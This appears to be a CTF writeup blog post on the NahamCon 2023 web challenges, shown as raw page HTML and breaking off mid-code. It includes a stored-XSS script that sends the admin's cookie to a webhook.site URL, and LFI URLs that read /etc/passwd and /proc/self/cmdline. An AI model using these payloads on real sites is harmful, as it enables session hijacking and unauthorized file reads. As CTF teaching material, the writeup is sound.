@@ -1,0 +1,1997 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>NahamCon 2023 CTF - Web Challenges - Saad Akhtar</title><meta name="Description" content="Writeup for all the web challenges in NahamCon 2023 CTF."><meta property="og:title" content="NahamCon 2023 CTF - Web Challenges" />
+<meta property="og:description" content="Writeup for all the web challenges in NahamCon 2023 CTF." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/nahamcon2023-web/" /><meta property="og:image" content="/nahamcon2023-web/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T07:00:21+05:00" />
+<meta property="article:modified_time" content="2023-06-22T07:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/nahamcon2023-web/0.png"/>
+<meta name="twitter:title" content="NahamCon 2023 CTF - Web Challenges"/>
+<meta name="twitter:description" content="Writeup for all the web challenges in NahamCon 2023 CTF."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/nahamcon2023-web/" /><link rel="prev" href="/hackweek23-ctf/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "NahamCon 2023 CTF - Web Challenges",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/nahamcon2023-web\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/nahamcon2023-web\/0.png",
+                            "width":  1920 ,
+                            "height":  1920 
+                        }],"genre": "posts","keywords": "ctf, writeup, nahamcon2023","wordcount":  4073 ,
+        "url": "\/nahamcon2023-web\/","datePublished": "2023-06-22T07:00:21+05:00","dateModified": "2023-06-22T07:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Writeup for all the web challenges in NahamCon 2023 CTF."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NahamCon 2023 CTF - Web Challenges</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-22">2023-06-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4073 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;20 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/nahamcon2023-web/0.png"
+        data-srcset="/nahamcon2023-web/0.png, /nahamcon2023-web/0.png 1.5x, /nahamcon2023-web/0.png 2x"
+        data-sizes="auto"
+        alt="/nahamcon2023-web/0.png"
+        title="Writeup for all the web challenges in NahamCon 2023 CTF." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#star-wars">Star Wars</a></li>
+    <li><a href="#hidden-figures">Hidden Figures</a></li>
+    <li><a href="#museum">Museum</a></li>
+    <li><a href="#obligatory">Obligatory</a></li>
+    <li><a href="#marmalade-5">Marmalade 5</a></li>
+    <li><a href="#stickers">Stickers</a></li>
+    <li><a href="#transfer">Transfer</a>
+      <ul>
+        <li><a href="#inserting-a-valid-active-session">Inserting a valid active session</a></li>
+        <li><a href="#generating-a-payload-for-rce">Generating a payload for RCE</a></li>
+        <li><a href="#inserting-the-payload-into-the-files-table">Inserting the payload into the files table</a></li>
+        <li><a href="#final-script">Final Script</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of NahamCon 2023 CTF.</p>
+<h1 id="introduction">Introduction</h1>
+<p>I participated in the NahamCon 2023 CTF with the team <code>m4lware</code>. We ended up <code>82</code> out of <code>2517</code> teams. From the web challenges I was only able to solve 2 challenges (Star Wars &amp; Stickers) during the time of the competition but I managed to solve all of them afterwards with some hints and help.</p>
+<h2 id="star-wars">Star Wars</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/38.png" title="Star Wars" data-thumbnail="/nahamcon2023-web/38.png" data-sub-html="<h2>Star Wars</h2><p>Star Wars</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/38.png"
+            data-srcset="/nahamcon2023-web/38.png, /nahamcon2023-web/38.png 1.5x, /nahamcon2023-web/38.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/38.png" width="1057" height="298" />
+    </a><figcaption class="image-caption">Star Wars</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p>The challenge was very easy. We got a simple website. We can create an account and login as the user. There we see a blog post by <code>admin</code> user.</p>
+<p>On the blog post there was a comment section.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/39.png" title="comment" data-thumbnail="/nahamcon2023-web/39.png" data-sub-html="<h2>comment</h2><p>comment</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/39.png"
+            data-srcset="/nahamcon2023-web/39.png, /nahamcon2023-web/39.png 1.5x, /nahamcon2023-web/39.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/39.png" width="1208" height="256" />
+    </a><figcaption class="image-caption">comment</figcaption>
+    </figure></p>
+<p>The comment feature has no validation or sanitization so trying out for <code>XSS</code> we can inject a simple <code>XSS</code> payload and it works.</p>
+<p>Payload: <code>&lt;script&gt;alert(2)&lt;/script&gt;</code></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/40.png" title="XSS triggered" data-thumbnail="/nahamcon2023-web/40.png" data-sub-html="<h2>XSS triggered</h2><p>XSS triggered</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/40.png"
+            data-srcset="/nahamcon2023-web/40.png, /nahamcon2023-web/40.png 1.5x, /nahamcon2023-web/40.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/40.png" width="1244" height="519" />
+    </a><figcaption class="image-caption">XSS triggered</figcaption>
+    </figure></p>
+<p>We also got a message that comment would be reviewed by admin.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/41.png" title="comment msg" data-thumbnail="/nahamcon2023-web/41.png" data-sub-html="<h2>comment msg</h2><p>comment msg</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/41.png"
+            data-srcset="/nahamcon2023-web/41.png, /nahamcon2023-web/41.png 1.5x, /nahamcon2023-web/41.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/41.png" width="496" height="70" />
+    </a><figcaption class="image-caption">comment msg</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/nahamcon2023-web/42.png" title="comment msg" data-thumbnail="/nahamcon2023-web/42.png" data-sub-html="<h2>comment msg</h2><p>comment msg</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/42.png"
+            data-srcset="/nahamcon2023-web/42.png, /nahamcon2023-web/42.png 1.5x, /nahamcon2023-web/42.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/42.png" width="453" height="67" />
+    </a><figcaption class="image-caption">comment msg</figcaption>
+    </figure></p>
+<p>This means that we can inject a malicious script and when the admin would review it the XSS would be triggered and we can get his cookie.</p>
+<p>Get a link from webhook.site.</p>
+<p>Then create an XSS payload as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;https://webhook.site/a3c68f0c-&lt;SNIP&gt;/?cookie=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">cookie</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Inject the payload in the comment and you&rsquo;ll get the admin cookie in a while.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/43.png" title="&amp;ldquo;Admin cookie in webhooks&amp;rdquo;" data-thumbnail="/nahamcon2023-web/43.png" data-sub-html="<h2>Admin cookie in webhooks</h2><p>&amp;ldquo;Admin cookie in webhooks&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/43.png"
+            data-srcset="/nahamcon2023-web/43.png, /nahamcon2023-web/43.png 1.5x, /nahamcon2023-web/43.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/43.png" width="542" height="243" />
+    </a><figcaption class="image-caption">Admin cookie in webhooks</figcaption>
+    </figure></p>
+<p>Replace your cookie with admin&rsquo;s cookie and you&rsquo;ll be logged in as admin.</p>
+<p>Go to <code>/admin</code> and you&rsquo;ll get the flag.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/44.png" title="Star wars flag" data-thumbnail="/nahamcon2023-web/44.png" data-sub-html="<h2>Star wars flag</h2><p>Star wars flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/44.png"
+            data-srcset="/nahamcon2023-web/44.png, /nahamcon2023-web/44.png 1.5x, /nahamcon2023-web/44.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/44.png" width="1366" height="427" />
+    </a><figcaption class="image-caption">Star wars flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{a538c88890d45a382e44dfd00296a99b}</code></p>
+<h2 id="hidden-figures">Hidden Figures</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/1.png" title="Hidden Figures" data-thumbnail="/nahamcon2023-web/1.png" data-sub-html="<h2>Hidden Figures</h2><p>Hidden Figures</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/1.png"
+            data-srcset="/nahamcon2023-web/1.png, /nahamcon2023-web/1.png 1.5x, /nahamcon2023-web/1.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/1.png" width="1066" height="357" />
+    </a><figcaption class="image-caption">Hidden Figures</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p>Being a static website, it doesn&rsquo;t have anything interesting.</p>
+<p>Looking at the Page Source there are multiple images with base64 encoded src.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/2.png" title="Base64 encoded src" data-thumbnail="/nahamcon2023-web/2.png" data-sub-html="<h2>Base64 encoded src</h2><p>Base64 encoded src</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/2.png"
+            data-srcset="/nahamcon2023-web/2.png, /nahamcon2023-web/2.png 1.5x, /nahamcon2023-web/2.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/2.png" width="1366" height="60" />
+    </a><figcaption class="image-caption">Base64 encoded src</figcaption>
+    </figure></p>
+<p>Using <em>extract files</em> in cyberchef, we get the following image.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/3.png" title="Cyberchef extract file" data-thumbnail="/nahamcon2023-web/3.png" data-sub-html="<h2>Cyberchef extract file</h2><p>Cyberchef extract file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/3.png"
+            data-srcset="/nahamcon2023-web/3.png, /nahamcon2023-web/3.png 1.5x, /nahamcon2023-web/3.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/3.png" width="1086" height="480" />
+    </a><figcaption class="image-caption">Cyberchef extract file</figcaption>
+    </figure></p>
+<p>This indicates the flag may be in one of these images on the website.</p>
+<p>Extracting files from these images one by one we get the flag in one of the images.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/4.png" title="Hidden Figures Flag" data-thumbnail="/nahamcon2023-web/4.png" data-sub-html="<h2>Hidden Figures Flag</h2><p>Hidden Figures Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/4.png"
+            data-srcset="/nahamcon2023-web/4.png, /nahamcon2023-web/4.png 1.5x, /nahamcon2023-web/4.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/4.png" width="1082" height="481" />
+    </a><figcaption class="image-caption">Hidden Figures Flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{e62630124508ddb3952843f183843343}</code></p>
+<h2 id="museum">Museum</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/5.png" title="Museum" data-thumbnail="/nahamcon2023-web/5.png" data-sub-html="<h2>Museum</h2><p>Museum</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/5.png"
+            data-srcset="/nahamcon2023-web/5.png, /nahamcon2023-web/5.png 1.5x, /nahamcon2023-web/5.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/5.png" width="1051" height="218" />
+    </a><figcaption class="image-caption">Museum</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p>The website provides a functionality to view different images like in a Museum.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/6.png" title="Landing Page" data-thumbnail="/nahamcon2023-web/6.png" data-sub-html="<h2>Landing Page</h2><p>Landing Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/6.png"
+            data-srcset="/nahamcon2023-web/6.png, /nahamcon2023-web/6.png 1.5x, /nahamcon2023-web/6.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/6.png" width="1366" height="583" />
+    </a><figcaption class="image-caption">Landing Page</figcaption>
+    </figure></p>
+<p>Upon viewing any image it takes us to <a href="http://challenge.nahamcon.com:31033/browse?artifact=angwy.jpg" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/browse?artifact=angwy.jpg</a></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/7.png" title="Image view" data-thumbnail="/nahamcon2023-web/7.png" data-sub-html="<h2>Image view</h2><p>Image view</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/7.png"
+            data-srcset="/nahamcon2023-web/7.png, /nahamcon2023-web/7.png 1.5x, /nahamcon2023-web/7.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/7.png" width="1366" height="582" />
+    </a><figcaption class="image-caption">Image view</figcaption>
+    </figure></p>
+<p>The artifact parameter looks promising for a LFI vulnerability.</p>
+<p>Upon several tries, I was able to read files from the system with following payload.</p>
+<p><a href="http://challenge.nahamcon.com:31033/browse?artifact=/./etc/passwd" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/browse?artifact=/./etc/passwd</a></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/8.png" title="/etc/passwd with LFI" data-thumbnail="/nahamcon2023-web/8.png" data-sub-html="<h2>/etc/passwd with LFI</h2><p>/etc/passwd with LFI</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/8.png"
+            data-srcset="/nahamcon2023-web/8.png, /nahamcon2023-web/8.png 1.5x, /nahamcon2023-web/8.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/8.png" width="1366" height="591" />
+    </a><figcaption class="image-caption">/etc/passwd with LFI</figcaption>
+    </figure></p>
+<p>We can&rsquo;t directly read the <code>/flag.txt</code> as the application blocks us from that.</p>
+<p>To read the source code we&rsquo;ll need the path to current application.</p>
+<p>We can get this by reading the <code>/proc/self/cmdline</code>.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>/proc/self/cmdline<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">proc/self/cmdline can be used to get an idea of how the program was invoked (and potentially see source code location).</div>
+        </div>
+    </div>
+<p>Source: <a href="https://twitter.com/_JohnHammond/status/1318545091489824769" target="_blank" rel="noopener noreffer ">https://twitter.com/_JohnHammond/status/1318545091489824769</a></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/9.png" title="/proc/self/cmdline" data-thumbnail="/nahamcon2023-web/9.png" data-sub-html="<h2>/proc/self/cmdline</h2><p>/proc/self/cmdline</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/9.png"
+            data-srcset="/nahamcon2023-web/9.png, /nahamcon2023-web/9.png 1.5x, /nahamcon2023-web/9.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/9.png" width="1366" height="408" />
+    </a><figcaption class="image-caption">/proc/self/cmdline</figcaption>
+    </figure></p>
+<p>Now reading the source code from <a href="http://challenge.nahamcon.com:31033/browse?artifact=/./home/museum/app.py" target="_blank" rel="noopener noreffer ">http://challenge.nahamcon.com:31033/browse?artifact=/./home/museum/app.py</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">artifacts</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s1">&#39;public&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">artifacts</span><span class="o">=</span><span class="n">artifacts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/public/&lt;file_name&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">public_sendfile</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Error retrieving file&#34;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/browse&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">browse</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;artifact&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_name</span><span class="p">:</span>
